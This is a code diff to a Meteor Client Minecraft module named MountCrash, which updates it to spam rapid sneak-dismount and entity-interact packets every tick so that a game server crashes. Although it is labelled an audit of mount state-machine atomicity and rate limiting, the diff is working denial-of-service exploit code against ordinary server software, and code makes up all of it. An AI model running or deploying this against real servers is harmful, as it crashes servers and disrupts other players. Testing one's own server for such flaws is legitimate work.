@@ -7,15 +7,16 @@ import meteordevelopment.meteorclient.settings.*;
 import meteordevelopment.meteorclient.systems.modules.Module;
 import meteordevelopment.orbit.EventHandler;
 import net.minecraft.entity.Entity;
-import net.minecraft.network.packet.c2s.play.ClientCommandC2SPacket;
+import net.minecraft.network.packet.c2s.play.PlayerInputC2SPacket;
 import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;
+import net.minecraft.util.PlayerInput;
 import net.minecraft.util.Hand;
 import net.minecraft.util.hit.EntityHitResult;
 
 /**
  * AUDIT: Mount / Dismount Crash
  *
- * Spams rapid mount (START_RIDING_JUMP / interact) and dismount (STOP_RIDING_JUMP)
+ * Spams rapid dismount (START_SNEAKING / STOP_SNEAKING) and mount (interact)
  * packets while riding or looking at a rideable entity. The mount/dismount cycle
  * involves creating/destroying the vehicle-passenger relationship, updating entity
  * tracking, and recomputing bounding boxes for all involved entities. Rapid cycling
@@ -55,6 +56,9 @@ public class MountCrash extends Module {
             "Rapid mount/dismount packet spam. Tests mount state-machine atomicity and transition rate limiting.");
     }
 
+    @Override
+    public void onActivate() { ticksActive = 0; packetsSent = 0; }
+
     @EventHandler
     private void onTick(TickEvent.Pre event) {
         if (mc.player == null) return;
@@ -64,17 +68,17 @@ public class MountCrash extends Module {
 
         for (int i = 0; i < perTick.get(); i++) {
             if (vehicle != null) {
-                mc.player.networkHandler.sendPacket(new ClientCommandC2SPacket(
-                    mc.player, ClientCommandC2SPacket.Mode.START_RIDING_JUMP));
-            packetsSent++;
-                mc.player.networkHandler.sendPacket(new ClientCommandC2SPacket(
-                    mc.player, ClientCommandC2SPacket.Mode.STOP_RIDING_JUMP));
-            packetsSent++;
+                // PlayerInput sneak=true → dismount trigger; rapid sneak on/off cycles the dismount path
+                mc.player.networkHandler.sendPacket(new PlayerInputC2SPacket(
+                    new PlayerInput(false, false, false, false, false, true, false)));
+                packetsSent++;
+                mc.player.networkHandler.sendPacket(new PlayerInputC2SPacket(PlayerInput.DEFAULT));
+                packetsSent++;
             }
             if (interactToo.get() && looked != null) {
                 mc.player.networkHandler.sendPacket(
                     PlayerInteractEntityC2SPacket.interact(looked, mc.player.isSneaking(), Hand.MAIN_HAND));
-            packetsSent++;
+                packetsSent++;
             }
         }
         if (vehicle == null && looked == null) warning("Ride something or look at a rideable entity.");
